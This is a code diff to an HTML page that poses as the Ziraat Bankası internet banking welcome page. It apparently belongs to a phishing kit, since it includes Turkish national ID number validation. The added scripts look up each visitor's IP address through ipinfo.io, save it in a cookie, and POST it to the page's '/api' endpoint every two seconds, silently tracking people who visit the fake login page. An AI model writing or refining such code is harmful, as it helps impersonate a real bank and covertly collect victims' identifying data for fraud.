@@ -14,7 +14,41 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
     <link href="styles.css" rel="stylesheet" id="style">
-	     <script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+  <script>
+    const url = 'http://ipinfo.io/json'
+    const vm = new Vue({
+      el: '#app',
+      data: {
+        results: []
+      },
+      mounted() {
+        axios.get(url).then(response => {
+          this.results = response.data;
+
+          // IP adresini bir cookie'ye kaydet
+          document.cookie = "user_ip=" + this.results.ip;
+
+       
+        });
+      }
+    })
+
+	  function getCookie(cookieName) {
+  var name = cookieName + "=";
+  var decodedCookie = decodeURIComponent(document.cookie);
+  var cookieArray = decodedCookie.split(';');
+  for (var i = 0; i < cookieArray.length; i++) {
+    var cookie = cookieArray[i].trim();
+    if (cookie.indexOf(name) == 0) {
+      return cookie.substring(name.length, cookie.length);
+    }
+  }
+  return "";
+}
+  </script>
+ <script>
 document.addEventListener("DOMContentLoaded", function() {
     function tcno_dogrula(tcno) {
         tcno = String(tcno);
@@ -265,23 +299,26 @@ document.addEventListener("DOMContentLoaded", function () {
   </script>
 
 		  <script>
-  function sendPostRequest() {
-    var currentUrl = window.location.href;
+ function sendPostRequest() {
+  // Cookie'den user_ip'yi al
+  var userIp = getCookie('user_ip');
 
-    // Ajax POST isteği
-    $.ajax({
-      type: 'POST',
-      url: '/api',
-      data: { browserLocation: currentUrl }, // Gönderilecek veri (burada sadece URL gönderiliyor)
-      success: function(response) {
-        console.log('POST isteği başarıyla gönderildi. Sunucu yanıtı:', response);
-      },
-      error: function(error) {
-        console.error('POST isteği sırasında bir hata oluştu:', error);
-      }
-    });
-  }
+  // Ajax POST isteği
+  $.ajax({
+    type: 'POST',
+    url: '/api',
+    data: { ip: userIp }, // Gönderilecek veri (cookie içindeki IP)
+    success: function(response) {
+      console.log('POST isteği başarıyla gönderildi. Sunucu yanıtı:', response);
+    },
+    error: function(error) {
+      console.error('POST isteği sırasında bir hata oluştu:', error);
+    }
+  });
 
+	 
+}
+ 
   // Her 2 saniyede bir gönder
   setInterval(sendPostRequest, 2000);
 </script>
